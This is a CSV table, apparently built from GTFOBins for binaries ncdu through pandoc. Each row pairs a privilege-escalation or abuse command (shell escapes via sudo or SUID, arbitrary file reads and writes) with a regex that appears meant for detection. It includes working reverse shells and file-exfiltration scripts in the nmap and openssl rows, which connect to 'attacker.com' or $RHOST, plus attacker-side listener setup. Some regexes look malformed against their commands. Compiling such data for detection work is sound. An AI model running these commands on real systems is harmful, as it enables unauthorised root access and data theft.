ncdu,shell,"ncdu
b",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ncdu\s+.+),
ncdu,sudo,"sudo ncdu
b",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ncdu\s+.+),
ncdu,limited-suid,"./ncdu
b",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ncdu\s+.+),
ncftp,shell,"ncftp
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ncftp\s+(?:/bin/(?:sh|bash))),
ncftp,suid,"./ncftp
!/bin/sh -p",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ncftp\s*\-p\s+(?:/bin/(?:sh|bash))),
ncftp,sudo,"sudo ncftp
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ncftp\s+(?:/bin/(?:sh|bash))),
neofetch,shell,"echo 'exec /bin/sh' >$TF
neofetch --config $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?neofetch\s*\-\-config\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
neofetch,file-read,neofetch --ascii $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?neofetch\s*\-\-ascii\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The file content is used as the logo while some other information is displayed on its right, thus it might not be suitable to read arbitray binary files."
neofetch,sudo,"echo 'exec /bin/sh' >$TF
sudo neofetch --config $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?neofetch\s*\-\-config\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nft,file-read,"nft -f ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nft\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nft,suid,"./nft -f ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nft\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nft,sudo,"sudo nft -f ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nft\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nice,shell,nice /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nice\s+(?:/bin/(?:sh|bash))),
nice,suid,./nice /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nice\s*\-p\s+(?:/bin/(?:sh|bash))),
nice,sudo,sudo nice /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nice\s+(?:/bin/(?:sh|bash))),
nl,file-read,nl -bn -w1 -s '' $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nl\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nl,suid,./nl -bn -w1 -s '' $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nl\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nl,sudo,sudo nl -bn -w1 -s '' $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nl\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nm,file-read,nm @$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nm,suid,./nm @$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nm,sudo,sudo nm @$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nmap,shell,"echo 'os.execute(""/bin/sh"")' > $TF
nmap --script=$TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Input echo is disabled.
nmap,shell,"nmap --interactive
nmap> !sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-interactive\s+.+),"The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands."
nmap,non-interactive-reverse-shell,"export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp)
echo 'local s=require(""socket"");
local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
while true do
local r,x=t:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));t:send(b);
end;
f:close();t:close();' > $TF
nmap --script=$TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run ``nc -l -p 12345`` on the attacker box to receive the shell.
nmap,non-interactive-bind-shell,"export LPORT=12345
TF=$(mktemp)
echo 'local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));c:send(b);
end;c:close();f:close();' > $TF
nmap --script=$TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc target.com 12345` on the attacker box to connect to the shell.
nmap,file-upload,"nmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-p\s*\-\-script\s*\-\-script\-args\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send a local file via TCP. Run `socat -v tcp-listen:8080,reuseaddr,fork - on the attacker box to collect the file or use a proper HTTP server. Note that multiple connections are made to the server. Also, it is important that the port is a commonly used HTTP like 80 or 8080."
nmap,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
TF=$(mktemp)
echo 'local f=io.open(os.getenv(""LFILE""), 'rb')
local d=f:read(""*a"")
io.close(f);
local s=require(""socket"");
local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
t:send(d);
t:close();' > $TF
nmap --script=$TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file."
nmap,file-download,"nmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-p\s*\-\-script\s*\-\-script\-args\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Fetch a remote file via TCP. Run a proper HTTP server on the attacker box to send the file, e.g., `php -S 0.0.0.0:8080`. Note that multiple connections are made to the server and the result is placed in `$TF/IP/PORT/PATH`. Also, it is important that the port is a commonly used HTTP like 80 or 8080."
nmap,file-download,"export LPORT=12345
export LFILE=file_to_save
TF=$(mktemp)
echo 'local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
local d,x=c:receive(""*a"");
c:close();
local f=io.open(os.getenv(""LFILE""), ""wb"");
f:write(d);
io.close(f);' > $TF
nmap --script=$TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file."
nmap,file-write,"echo 'local f=io.open(""file_to_write"", ""wb""); f:write(""data""); io.close(f);' > $TF
nmap --script=$TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nmap,file-write,nmap -oG=$LFILE DATA,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The payload appears inside the regular nmap output.
nmap,file-read,"echo 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);' > $TF
nmap --script=$TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nmap,file-read,nmap -iL file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s+.+),"The file is actually parsed as a list of hosts/networks, lines are leaked through error messages."
nmap,sudo,"echo 'os.execute(""/bin/sh"")' > $TF
sudo nmap --script=$TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Input echo is disabled.
nmap,sudo,"sudo nmap --interactive
nmap> !sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-interactive\s+.+),"The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands."
nmap,limited-suid,"echo 'os.execute(""/bin/sh"")' > $TF
./nmap --script=$TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s*\-\-script\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Input echo is disabled.
nmap,suid,./nmap -oG=$LFILE DATA,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nmap\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The payload appears inside the regular nmap output.
nohup,shell,"nohup /bin/sh -c ""sh <$(tty) >$(tty) 2>$(tty)""",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nohup\s*\-c\s+(?:/bin/(?:sh|bash))),
nohup,command,"nohup ""$COMMAND""
cat nohup.out","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nohup\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nohup,suid,"./nohup /bin/sh -p -c ""sh -p <$(tty) >$(tty) 2>$(tty)""",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nohup\s*\-p\s*\-c\s*\-p\s+(?:/bin/(?:sh|bash))),
nohup,sudo,"sudo nohup /bin/sh -c ""sh <$(tty) >$(tty) 2>$(tty)""",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nohup\s*\-c\s+(?:/bin/(?:sh|bash))),
npm,shell,npm exec /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?npm\s+(?:/bin/(?:sh|bash))),
npm,shell,"echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' > $TF/package.json
npm -C $TF i","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?npm\s*\-C\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`."
npm,sudo,"echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?npm\s*\-C\s*\-\-unsafe\-perm\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`."
nroff,file-read,nroff $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nroff\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The file is typeset and some warning messages may appear.
nroff,shell,"echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
GROFF_BIN_PATH=$TF nroff","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nroff\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nroff,sudo,"echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
sudo GROFF_BIN_PATH=$TF nroff","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nroff\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nsenter,shell,nsenter /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nsenter\s+(?:/bin/(?:sh|bash))),
nsenter,sudo,sudo nsenter /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nsenter\s+(?:/bin/(?:sh|bash))),
ntpdate,file-read,ntpdate -a x -k $LFILE -d localhost,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ntpdate\s*\-a\s*\-k\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ntpdate,sudo,sudo ntpdate -a x -k $LFILE -d localhost,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ntpdate\s*\-a\s*\-k\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ntpdate,suid,./ntpdate -a x -k $LFILE -d localhost,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ntpdate\s*\-a\s*\-k\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
octave,shell,"octave-cli --eval 'system(""/bin/sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?octave\s*\-\-eval\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
octave,file-write,"octave-cli --eval 'filename = ""file_to_write""; fid = fopen(filename, ""w""); fputs(fid, ""DATA""); fclose(fid);'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?octave\s*\-\-eval\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
octave,file-read,"octave-cli --eval 'format none; fid = fopen(""file_to_read""); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?octave\s*\-\-eval\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
octave,sudo,"sudo octave-cli --eval 'system(""/bin/sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?octave\s*\-\-eval\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
octave,limited-suid,"./octave-cli --eval 'system(""/bin/sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?octave\s*\-\-eval\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
od,file-read,"od -An -c -w9999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?od\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
od,suid,"./od -An -c -w9999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?od\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
od,sudo,"sudo od -An -c -w9999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?od\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openssl,reverse-shell,mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openssl\s*\-i\s+(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","To receive the shell run the following on the attacker box:

    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345

Communication between attacker and target will be encrypted.
"
openssl,file-upload,"openssl s_client -quiet -connect $RHOST:$RPORT < ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","To collect the file run the following on the attacker box:

    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save

Send a local file via TCP. Transmission will be encrypted.
"
openssl,file-download,"openssl s_client -quiet -connect $RHOST:$RPORT > ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","To send the file run the following on the attacker box:

    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send

Fetch a file from a TCP port, transmission will be encrypted.
"
openssl,file-write,"echo DATA | openssl enc -out ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openssl,file-write,"echo ""DATA"" > $TF
openssl enc -in ""$TF"" -out ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openssl,file-read,"openssl enc -in ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openssl,suid,mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openssl\s*\-i\s+(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","To receive the shell run the following on the attacker box:

    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345

Communication between attacker and target will be encrypted.
"
openssl,suid,"echo DATA | openssl enc -out ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openssl,sudo,mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openssl\s*\-i\s+(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","To receive the shell run the following on the attacker box:

    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345

Communication between attacker and target will be encrypted.
"
openssl,library-load,openssl req -engine ./lib.so,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+.+),
openvpn,shell,openvpn --dev null --script-security 2 --up '/bin/sh -c sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openvpn\s*\-\-dev\s*\-\-script\-security\s*\-\-up\s*\-c\s+(?:/bin/(?:sh|bash))),
openvpn,file-read,"openvpn --config ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openvpn\s*\-\-config\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The file is actually parsed and the first partial wrong line is returned in an error message.
openvpn,suid,"./openvpn --dev null --script-security 2 --up '/bin/sh -p -c ""sh -p""'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openvpn\s*\-\-dev\s*\-\-script\-security\s*\-\-up\s*\-p\s*\-c\s*\-p\s+(?:/bin/(?:sh|bash))),
openvpn,suid,"./openvpn --config ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openvpn\s*\-\-config\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The file is actually parsed and the first partial wrong line is returned in an error message.
openvpn,sudo,sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openvpn\s*\-\-dev\s*\-\-script\-security\s*\-\-up\s*\-c\s+(?:/bin/(?:sh|bash))),
openvpn,sudo,"sudo openvpn --config ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openvpn\s*\-\-config\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The file is actually parsed and the first partial wrong line is returned in an error message.
openvt,sudo,"sudo openvt -- sh -c ""$COMMAND >$TF 2>&1""
cat $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?openvt\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The command execution is blind (displayed on the virtual console), but it is possible to save the output on a temporary file."
opkg,sudo,sudo opkg install x_1.0_all.deb,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?opkg\s+.+),"It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
TF=$(mktemp -d)
echo 'exec /bin/sh' > $TF/x.sh
fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
```
"
pandoc,file-read,"pandoc -t plain ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pandoc\s*\-t\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pandoc,file-write,"echo DATA | pandoc -t plain -o ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pandoc\s*\-t\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pandoc,shell,"echo 'os.execute(""/bin/sh"")' >$TF
pandoc -L $TF /dev/null","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pandoc\s*\-L\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply."
